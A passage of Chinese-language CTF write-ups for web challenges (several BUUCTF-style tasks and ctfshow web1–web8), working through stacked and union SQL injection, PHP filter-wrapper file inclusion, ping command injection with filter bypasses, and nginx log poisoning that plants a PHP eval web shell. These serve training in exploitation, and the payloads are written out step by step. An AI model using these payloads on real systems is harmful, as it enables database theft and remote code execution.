<p>输入1’ or ‘1’&#x3D;’1,正常回显，应该是字符型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.猜解SQL查询语句中的字段数</p>
<p>输入1’ order by 3 # 回显出错，说明有两个字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error 1054 : Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>

<p>3.显示字段</p>
<p>输入1′ union select 1,2 # 回显一个正则过滤规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>过滤了 select，update，delete，drop，insert，where 和 点</p>
<p>过滤了这么多词，尝试堆叠注入</p>
<p>4.查询数据库</p>
<p>输入1’;show databases;# 成功回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明存在堆叠注入</p>
<p>5.查询表</p>
<p>输入1’;show tables;# 成功回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到两个表words和1919810931114514</p>
<p>6.查询表中字段</p>
<p>查看1919810931114514，输入1’; show columns from <code>1919810931114514</code>; #</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到1919810931114514中有我们想要的flag字段</p>
<p>7.查询另一个表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现flag，因为查看flag的回显会出现在words里，为了回显在flag所属的表，而发现alter、rename又没有被过滤，则试着进行表和字段的重命名</p>
<p>因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id(或data)。然后程序查询就能查询到原本‘1919810931114514’表中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br><span class="line">#rename命令用于修改表名。</span><br><span class="line">#rename命令格式：rename table 原表名 to 新表名;</span><br><span class="line">#alert修改字段名及字段属性值</span><br><span class="line">alert table 表名 change 旧字段名 新字段名 新字段属性; </span><br></pre></td></tr></table></figure>

<p>输入1’ or 1&#x3D;’1,查询就得到flag</p>
<h1 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h1><p>打开页面只有一个a标签的超链接，指向的是?file&#x3D;flag.php。结合题目的名称不难联想到这是一题文件包含的题目。</p>
<pre><code>看到当?file=flag.php时，页面返回Can you find out the flag。先输入?file=/etc/passwd，确认一下有没有返回，是否真的有文件包含的漏洞。
</code></pre>
<p>看到确实存在文件包含漏洞，目前又没有其他的信息。我们不知道真正的flag藏在那个页面中。所以只能先用文件包含漏洞中php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource伪协议帮我们返回已知页面的代码。输入<code>?file=php://filter/convert.base64-encode/resource=index.php</code>就能得到index.php的源代码的base64密文。解密后得到一下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#x27;hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>大概意思就是过滤了php的几个伪协议，但刚好没过滤我们这个。<br>所以可以我们可以看到返回的结果<br>那现在就取一下flag.php的内容</p>
<p> 输入?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php就能得到flag.php的源代码的base64密文。解密后得到一下内容里面就有flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">//flag&#123;ace2c6ad-88d7-4c5d-a49e-38baeba72c32&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><p>打开题目就看到大大的PING,二话不说直接ping个本地ip</p>
<p>涉及知识点：</p>
<pre><code>在命令执行的过程中，可以通过一些常用特殊字符来执行其他语句

；  //命令分割符，即当执行完第一个命令，继续执行下一个命令

|   //管道
</code></pre>
<p>那么尝试在当前文件夹下，有什么东西吧</p>
<p>构造payload</p>
<pre><code> 127.0.0.1;ls
</code></pre>
<p> 我们都知道在linux系统搭建的页面，通常显示页面的路径是&#x2F;var&#x2F;www&#x2F;html，那么我们尝试返回当前路径查找</p>
<p>构造payload</p>
<pre><code> 127.0.0.1;cd ../../../;ls
</code></pre>
<p>在返回前三层的时候找到了flag 字样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>

<p>构造payload</p>
<pre><code>127.0.0.1;cd ../../../;cat flag
</code></pre>
<p>flag{977043da-6f7d-4f7a-9e8e-2c65837cb657}</p>
<h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>（1）页面里显示&#x2F;?ip&#x3D;,很明显要以ping的形式传一个参数给ip，并且我们要想执行其他命令，就要用命令分隔符也就是管道符连接，命令分隔符可以用”;“”|“”&amp;”三种，本题经过尝试发现第一步查看目录过滤了|，&amp;和空格。<br>这里介绍两种方式：<br>1.ping本地127.0.0.1<br>2.用||来代替127.0.0.1；<br>（2）虽然找到了放flag的文件，但是尝试后发现都不对，这里介绍一种思路，我们可以通过查看index.php的文件源码来查看源码，从而确认过滤了哪些东西，题目说过滤了命令连接符&amp;，\，空格，*，bash，&lt;&gt;，flag，？，我们得想一些其他方法来绕过<br>（3）要想得到flag了，我们需要绕过过滤掉的东西<br>这里介绍三种可以解决的特殊绕过方式：<br>1.拼接绕过法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>

<p>以上是题目给的绕过flag的源码，我们这里需要知道这是正则表达式匹配了ip的值中是否顺序出现了f、l、a、g四个字母。这样一来我们就可以拼接一个flag来绕过了，可以拼接f;lag fl;ag fla;g 但是这里需要注意：本题特殊就特殊在flag的字母顺序要不同（拼接绕过的一个大坑）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y=g;x=fla;$x$y</span><br><span class="line">y=ag;x=fl;$x$y</span><br><span class="line">y=lag;x=f;$x$y</span><br></pre></td></tr></table></figure>

<p>构造payload：&#x2F;?ip&#x3D;||y&#x3D;ag;x&#x3D;fl;cat$IFS$9$x$y.php跑一下查看源码得到flag</p>
<p>2.内联执行法<br>可以看到代码没有过滤掉符号&#96; 所以可以利用内联执行的方式直接打开flag文件,先执行命令ls，再把ls得到的文件名全部用命令cat打开，构建payload 跑一下，查看源码拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$6`ls`或者/?ip=||cat$IFS$6`ls`</span><br></pre></td></tr></table></figure>

<p>3.sh编码绕过法(base64编码)</p>
<p>使用方法：echo 命令编码|base64 -d|sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh可以换成bash, 但是题目过滤掉了</span><br><span class="line">也可以换成其他的编码形式，这里用base64的</span><br><span class="line">空格用$IFS$6替换掉</span><br><span class="line">cat flag.php 的base64编码为Y2F0IGZsYWcucGhw</span><br></pre></td></tr></table></figure>

<p>构造payload ， 相当于执行命令cat flag.php,查看源码得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span><br><span class="line">/?ip=||echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span><br></pre></td></tr></table></figure>

<h1 id="SUCTF-2019-EasySQL1"><a href="#SUCTF-2019-EasySQL1" class="headerlink" title="[SUCTF 2019]EasySQL1"></a>[SUCTF 2019]EasySQL1</h1><p>1.试试sql注入正常套路<br>（1）先试试1有回显<br>（2）再试试字母a没有回显<br>（3）试试单引号注入<code>1&#39; or &#39;1&#39;=&#39;1</code>,提示不一样，因此猜测这里有注入点<br>（4）试试有多少列,<code>1&#39; order by 4#</code>,还是不成功，因此一般的联合查询在这里不能使用<br>（5）基于时间的盲注和报错注入都需要嵌套联合查询语句来实现，因此可以跳过，直接试试布尔型盲注,<code>1&#39; and length(database())&gt;=1</code>还是不成功<br>2.利用堆叠注入<br>（1）查找所有数据库,1;show databases;#</p>
<p>（2）查询所有表名,1;show tables;#</p>
<p>（3）查询Flag表中的列,1;show columns from Flag#,不成功<br>3.接下来是网上的两种解法<br>（1）第一种是猜出了源码<strong>select $_POST[‘query’] || flag from Flag</strong>,<br>sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<br>第一种就按默认没有配置来进行，此时||就是逻辑或<br>||在命令执行中见过，<br>回顾:<br>command1;command2顺序执行<br>command1 || command2<br>如果command1执行失败，则执行command2<br>command1 &amp;&amp; command2<br>如果command1执行成功，则执行command2</p>
<p>因此只需要将<br>$_POST[‘query’]</p>
<p>提交的数据换成*,1(如果直接写的话会被报错，且写在后面会失效)<br>解释:<br>sql&#x3D;select.post[‘query’].”||flag from Flag”;（拼接语句）<br>如果$post[‘query’]的数据为  *,1</p>
<p>sql语句就变成了select *,1||flag from Flag，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。<br>此处的1是临时增加一列，列名为1且这一列的所有值都为1</p>
<p>执行payload：<code>*,1</code>,得到flag<br>（2）第二种是将||作为字符串连接符，因此需要在语句中更改其配置<br>sql_mode&#x3D;PIPES_AS_CONCAT时即可<br>Payload:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br>拼接完之后：select 1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1||flag from Flag<br>相当于是select 1 from Flag和select flag from Flag,得到flag</p>
<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>先看一下题目,有注入点，这里怀疑是SQL注入</p>
<p>先尝试读取一下index.php</p>
<p>这里使用php伪协议</p>
<p>payload：</p>
<p>php:&#x2F;&#x2F;filter:&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
<p>存在文件包含漏洞，但是这里报错了，分析之后是无法打开流：操作失败</p>
<p>这里去除php后缀</p>
<p>payload</p>
<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index</p>
<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805171203176.png" alt="image-20230805171203176"></p>
<p>解码之后找到index.php</p>
<pre><code>&lt;?php
                $file = $_GET[&#39;category&#39;];

                if(isset($file))
                &#123;
                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
                        include ($file . &#39;.php&#39;);
                    &#125;
                    else&#123;
                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
                    &#125;
                &#125;
                ?&gt;
</code></pre>
<p>传入的category参数必须有woofers,meowers,index才行</p>
<p>这里构造payload来包含flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?category=woofers/../flag</span><br></pre></td></tr></table></figure>

<p>这里使用的知识点是php:&#x2F;&#x2F;filter伪协议套协议</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?category=php://filter/convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805171429538.png" alt="image-20230805171429538"></p>
<p>base64解码得CTF{happiness_needs_no_filters}</p>
]]></content>
      <tags>
        <tag>ctf解题</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow</title>
    <url>/2023/08/17/ctfshow/</url>
    <content><![CDATA[<p>ctfshow</p>
<span id="more"></span>

<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>查看源码，base64解码得flag</p>
<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>构造SQL注入语句，这是一个登录功能，那应该考虑是字符串注入，在username后面加上<code> &#39; or 1=1  #</code>发送</p>
<p>成功登录。证明构造的语句没有问题，接下来就是一把梭，猜解字段数、获取数据库名、获取表名、获取字段、拿到flag！</p>
<p><code>&#39;username=ctfshow&#39; order by 3  #&amp;password=123</code>显示登录成功，</p>
<p><code>&#39;username=ctfshow&#39; order by 4  #</code>不显示，证明有三个字段。</p>
<p><code>username=ctfshow&#39; union select 1,2,3  #&amp;password=123</code>确定回显位置，看到2显示在了页面上，利用2这个位置继续搞。</p>
<p><code>username=ctfshow&#39; union select 1,database(),3  #&amp;password=123</code>获取到数据库名</p>
<p><code>username=ctfshow&#39; union select 1,group_concat(table_name),3  from information_schema.tables where table_schema=&#39;web2&#39;   #&amp;password=123</code> 获取数据库的表名，找到flag表啦</p>
<p><code>username=ctfshow&#39; union select 1,group_concat(column_name),3  from information_schema.columns where table_name=&#39;flag&#39;   #&amp;password=123</code>获取flag表中的字段名</p>
<p><code>username=ctfshow&#39; union select 1,group_concat(flag),3 from flag  #&amp;password=123</code>获取flag！</p>
<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>php伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf.show_web3</span><br><span class="line">&lt;?php include($_GET[&#x27;url&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p> 页面中显示了部分源码,明显是引导我们利用文件包含漏洞进行操作,源码中的include()函数通过GET请求接收一个url参数,那接下来我们就给它传递一个url参数</p>
<p>使用Burp Suite抓包,利用php:&#x2F;&#x2F;input伪协议执行PHP代码,代码的内容为执行系统命令,查看当前目录下所有文件</p>
<pre><code>?url=php://input        -- GET请求的url中拼接伪协议
&lt;?php system(&#39;ls&#39;)?&gt;    -- post请求内容构造需要执行的代码
</code></pre>
<p>得到crf_go_go_go index.php，该文件就是存放flag的文件</p>
<p>我们直接在url地址栏中拼接url参数,访问crf_go_go_go文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=ctf_go_go_go</span><br></pre></td></tr></table></figure>

<p>成功获取flag</p>
<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>日志注入</p>
<p> ($_GET[‘url’])可看出存在文件包含漏洞</p>
<p>F12打开网络栏，可以看到Server里面是nginx，尝试一下日志注入</p>
<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817104534044.png" alt="image-20230817104534044"></p>
<p> nginx服务器默认日志位置在</p>
<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>在url后面输入查看一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p> 发现可以</p>
<p>用Burp Suite抓包，在User-Agent后面写个🐎</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;])?&gt;</span><br></pre></td></tr></table></figure>

<p> 放包，注意看日志下面这时多出来一条</p>
<p>此时木马已经插入进去了，日志中的代码会被执行但不会显示</p>
<p>连接蚁剑</p>
<p>注意URL地址写的是日志地址，因为我们的🐎是传进日志里了</p>
<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817105306721.png" alt="image-20230817105306721"></p>
<p>在上层可以看到flag.txt</p>
<p> <img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817105325864.png" alt="image-20230817105325864"></p>
<p> 拿到flag</p>
<p>ctfshow{05eeaf03-2f53-4cc6-959c-f65fb4a7163a}</p>
<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>考点：php代码审计</p>
<pre><code> &lt;?php
        $flag=&quot;&quot;;
        $v1=$_GET[&#39;v1&#39;];
        $v2=$_GET[&#39;v2&#39;];
        if(isset($v1) &amp;&amp; isset($v2))&#123;
            if(!ctype_alpha($v1))&#123;
                die(&quot;v1 error&quot;);
            &#125;
            if(!is_numeric($v2))&#123;
                die(&quot;v2 error&quot;);
            &#125;
            if(md5($v1)==md5($v2))&#123;
                echo $flag;
            &#125;
        &#125;else&#123;
        
            echo &quot;where is flag?&quot;;
        &#125;
    ?&gt;  echo &quot;where is flag?&quot;;
    &#125;
?&gt;
</code></pre>
<ul>
<li>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</li>
<li>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</li>
</ul>
<p>这里我们可以使用MD5的0e绕过方式,输入一下payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>

<p>QNKCDZO 的md5值为 0e830400451993494058024219903391</p>
<p>240610708 的md5值为 0e462097431906509019562988736854</p>
<p>分别满足纯字母和数字字符串,并且md5值以0e开头,而0e开头的字符串参与比较(&#x3D;&#x3D;)时,会转化为0,也就是 0&#x3D;&#x3D;0,返回true使if判断成立,从而输出flag</p>
<p>常用的值：</p>
<pre><code>开头为0E（MD5值） 字母数字混合类型：
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
纯大写字母：
QLTHNDT
0e405967825401955372549139051580
QNKCDZO
0e830400451993494058024219903391
EEIZDOI
0e782601363539291779881938479162
纯数字：
240610708
0e462097431906509019562988736854
4011627063
0e485805687034439905938362701775
4775635065
0e998212089946640967599450361168
4790555361
0e643442214660994430134492464512
5432453531
0e512318699085881630861890526097
5579679820
0e877622011730221803461740184915
5585393579
0e664357355382305805992765337023
6376552501
0e165886706997482187870215578015
7124129977
0e500007361044747804682122060876
7197546197
0e915188576072469101457315675502
7656486157
0e451569119711843337267091732412
</code></pre>
<p>任意使用2个即可</p>
<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>web2的升级版，做了过滤</p>
<p>一打开页面是用户名密码登录，我们首先第一个想到的就是sql注入了，来用万能钥匙1’ or 1&#x3D;1#试一下，报错了<br>然后，我在密码框里同样注入万能钥匙试了一下，发现，密码框中输入空格也会多一个黑点，于是我猜测可能是把空格过滤了，为了验证 我的猜想，来抓包看一下服务器收到的页面请求包最后传递的用户名和密码的参数值是什么样子的</p>
<p>抓包果然发现，空格被过滤了</p>
<p>一般空格被过滤有如下替换方法</p>
<pre><code>/**/
()
回车(url编码中的%0a)
`(tap键上面的按钮)
tap
两个空格
</code></pre>
<p>我们就选用&#x2F;**&#x2F;来替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/or/**/1=1#</span><br></pre></td></tr></table></figure>

<p>好，登陆成功了</p>
<p>接下来，来老生常谈的爆库爆表爆字段吧<br><strong>爆库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;/**/union/**/select/**/1,database(),3#&amp;password=1</span><br></pre></td></tr></table></figure>

<p>得到数据库名为web2<br><strong>爆表</strong></p>
<pre><code>username=1&#39;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;password=1
</code></pre>
<p>表有flag和user<br><strong>爆字段</strong></p>
<pre><code>username=1&#39;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag&#39;#&amp;password=1
</code></pre>
<p>列名也为flag<br><strong>爆字段值</strong></p>
<pre><code>username=1&#39;/**/union/**/select/**/1,flag,3/**/from/**/flag#&amp;password=1
</code></pre>
<p>拿到flag</p>
<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>与we6相同<br>考点：sql注入 注入点的寻找<br>页面中有一个文章列表,随便点一个</p>
<p> 从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</p>
<p>测试发现存在空格过滤，用&#x2F;**&#x2F;绕过</p>
<p>首先判断注入点,输入以下payload,使SQL恒成立</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1/**/and/**/1</span><br></pre></td></tr></table></figure>

<p>可以看到,页面正常显示</p>
<p> 在输入以下payload,使SQL恒不成立</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1/**/and/**/0</span><br></pre></td></tr></table></figure>

<p>可以看到,页面空显示</p>
<p> 由此可以判断页面存在SQL注入,注入点为<strong>数值型注入</strong>,页面中有显示位,可以尝试<strong>联合注入</strong>进行脱库</p>
<p>1.判断显示位,此处id传一个-1,由于id通常不为负数,后端根据id查询不到内容,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure>

<p>2.判断当前使用的数据库,盲猜flag就藏在当前使用的数据库中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),3</span><br></pre></td></tr></table></figure>

<p>当前使用的数据库是web7</p>
<p>3.获取当前数据库中的所有表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3</span><br></pre></td></tr></table></figure>

<p>有一个flag表,那flag肯定就藏在这个表里面</p>
<p>4.获取flag表中的所有字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure>

<p>flag表中只有一个flag字段</p>
<p>5.查询flag表的flag字段,获取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3</span><br></pre></td></tr></table></figure>

<p>成功获取flag</p>
<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>提示是sql注入，第一步先试下 ’ or 1&#x3D;1# 提示sql注入错误</p>
<p>第二步试下&#x2F;**&#x2F;替代空格，还是错误</p>
<p>第三步，去掉’单引号，成功，说明过滤了单引号<br> 测试：<code>?id=1/**/or/**/1=1#</code></p>
<p>回显全部</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>无回显</p>
<p>考虑盲注</p>
<p>查看有多少字段<code>1/**/or/**/1=1/**/union/**/select/**/1,2,3#</code>，但是这里又提示sql错误，这里可能过滤了select和union关键字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤空格：可以使用/**/和%a0绕过</span><br><span class="line">过滤联合查询语句：可以使用盲注替代联合注入</span><br><span class="line">过滤逗号,：可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用 substr(database() from 1 for 1)来代替</span><br><span class="line">过滤and：可以使用or</span><br><span class="line">过滤单引号：表名可以用十六进制来表示</span><br></pre></td></tr></table></figure>

<p>脚本：</p>
